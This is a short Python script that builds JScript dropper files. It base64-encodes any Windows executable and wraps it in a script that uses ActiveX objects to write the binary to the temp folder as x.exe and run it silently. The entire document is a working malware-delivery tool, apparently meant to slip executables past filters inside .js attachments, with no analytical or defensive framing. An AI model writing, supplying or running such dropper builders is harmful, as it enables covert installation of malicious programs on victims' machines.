import base64
import os

def encode_exe_to_base64(input_file, output_file):
    try:
        with open(input_file, "rb") as file:
            exe_data = file.read()
            base64_encoded_data = base64.b64encode(exe_data).decode("utf-8")

        with open(output_file, "w") as file:
            file.write(base64_encoded_data)

        print("Encoding successful. Base64 data saved to:", output_file)
    except FileNotFoundError:
        print("Error: Input file not found.")
    except Exception as e:
        print("An error occurred:", str(e))


def convert_exe_to_js(base64_data):
    js_code = '''
    var D=new ActiveXObject("Microsoft.XMLDOM")
    var E=D.createElement("t")
    E.dataType="bin.base64"
    E.text="#base64#"
    var b=new ActiveXObject("ADODB.Stream")
    var p=new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(2)
    b.Type=1
    b.Open()
    b.Write(E.nodeTypedValue)
    b.SaveToFile(p+"\\\\x.exe",2)
    new ActiveXObject("WScript.Shell").Run(p+"\\\\x.exe")
    '''
    return js_code.replace('#base64#', base64_data)

if __name__ == "__main__":

    exefile = input("Enter file (.exe): ")

    current_dir = os.getcwd()

    output_base64_file = os.path.join(current_dir, "output_base64.txt")
    encode_exe_to_base64(exefile, output_base64_file)

    with open(output_base64_file,"r") as file:
        base64_data = file.read()

    js_code = convert_exe_to_js(base64_data)

    output_script_file = os.path.join(current_dir, "output_script.js")
    with open(output_script_file, "w") as file:
        file.write(js_code)

    os.remove(os.path.join(current_dir, "output_base64.txt"))    
